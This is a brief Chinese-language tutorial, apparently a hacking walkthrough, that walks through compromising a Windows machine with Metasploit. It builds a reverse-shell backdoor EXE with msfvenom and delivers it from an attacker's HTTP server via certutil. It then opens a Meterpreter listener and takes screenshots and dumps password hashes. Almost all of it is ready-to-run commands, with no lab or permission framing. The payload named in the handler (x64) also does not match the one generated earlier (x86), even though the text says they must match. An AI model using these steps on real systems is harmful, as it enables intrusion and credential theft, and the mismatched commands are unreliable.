

#### 一、使用 Metasploit 生成一个 EXE 安装包

1. 打开 Metasploit 控制台：`msfconsole`
2. 使用 Metasploit 的 `msfvenom` 生成后门 EXE 文件。命令格式如下：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<你的端口> -f exe -o <文件名>.exe
```

- `LHOST`: 指定攻击者的 IP 地址
- `LPORT`: 指定攻击者的监听端口
- `<文件名>.exe`: 输出的后门 EXE 文件名

#### 二、将 EXE 文件放入目标机

1. 在攻击者机器上使用 Python 搭建 HTTP 服务器：

`python3 -m http.server <端口号>`

2. 在目标 Windows 机器上使用 `certutil` 下载文件：

certutil -urlcache -split -f http://<攻击者IP>:<端口号>/<文件名>.exe

#### 三、开启 Metasploit 监听（msfconsole）

1. 进入 Metasploit 控制台：

msfconsole

2. 使用模块并设置相关参数：

##### 使用 exploit 模块
use exploit/multi/handler

##### 设置 payload 类型（与之前生成 EXE 文件时保持一致）
set payload windows/x64/meterpreter/reverse_tcp

##### 设置攻击者的 IP 地址
set lhost <攻击者IP>

##### 设置监听端口
set lport <端口号>

3. 启动监听：

run

##### 四、尝试获取目标 Windows 机的信息

1. **截图命令**：获取目标机的当前屏幕截图：

screenshot

2. **获取密码**：尝试提取密码散列：

hashdump

- 注意：如果密码超过 8 位且包含多种元素，破解难度会增加。
